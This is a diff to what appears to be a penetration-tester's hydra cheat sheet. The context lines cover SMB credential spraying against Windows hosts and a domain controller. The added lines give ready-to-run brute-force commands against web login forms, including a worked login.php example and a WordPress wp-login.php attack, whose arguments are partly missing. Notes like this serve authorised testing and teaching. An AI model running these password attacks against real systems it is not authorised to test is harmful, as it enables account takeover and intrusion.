@@ -22,3 +22,17 @@ hydra -C creds.txt -M windows-hosts.txt smb2
 For domain users, target the domain. In order for this attack to work, the domain MUST be specified and the curly braces ``{}`` are required. Additionally, eventhough it is a Domain the option requires ``workgroup:{DOMAINGOESHERE}``
 
 ``hydra -C creds.txt -m dc01 smb2 -m workgroup:{DOMAINGOESHERE}``
+
+## HTTP
+
+The syntax is listed below:
+
+``hydra -f -l <user> -P <wordlist> <ip> -t 10 http-post-form "<login-page>:<request-body>:<error-message>"``
+
+This is what an example of a completed attack could look like.
+
+`` hydra -f -l bwayne -P passwords.txt <ip> -t 10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"``
+
+For a Wordpress Bruteforce:
+
+``hydra -f -l -P -t 10 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location"``
